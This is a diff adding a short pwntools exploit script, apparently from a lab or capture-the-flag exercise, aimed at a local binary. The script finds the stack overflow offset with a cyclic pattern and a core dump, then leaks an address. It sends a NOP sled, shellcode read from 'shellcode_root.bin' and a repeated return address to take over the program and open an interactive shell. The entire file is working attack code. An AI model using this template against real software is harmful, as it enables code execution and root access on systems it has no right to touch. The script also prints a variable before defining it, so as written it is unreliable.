@@ -1,0 +1,48 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+target_program = './a.out'
+exe = context.binary = ELF(target_program)
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+io = start()
+# find the offset
+io.sendline(cyclic(500, n=4))
+io.wait() #wait until tube is closed and coredump file is generated
+
+core = Coredump('./core')
+offset = cyclic_find(core.read(core.esp, 4), n=4)
+print(f'offset = {offset}')
+
+# open next tube
+io = start()
+
+io.recvuntil(' at ')
+address = int(io.recvline(False), 16)
+print("repeat ret add: ",repeat_ret_address)
+
+repeat_ret_address = p32(address)*5
+
+f = open("shellcode_root.bin","rb")
+shellcode_user = f.read()
+f.close()
+
+
+sled_len = offset - len(repeat_ret_address)-len(shellcode_user)
+NOPSled = b'\x90'*sled_len # asm('nop')
+io.sendline(NOPSled+shellcode_user+repeat_ret_address)
+
+io.interactive()
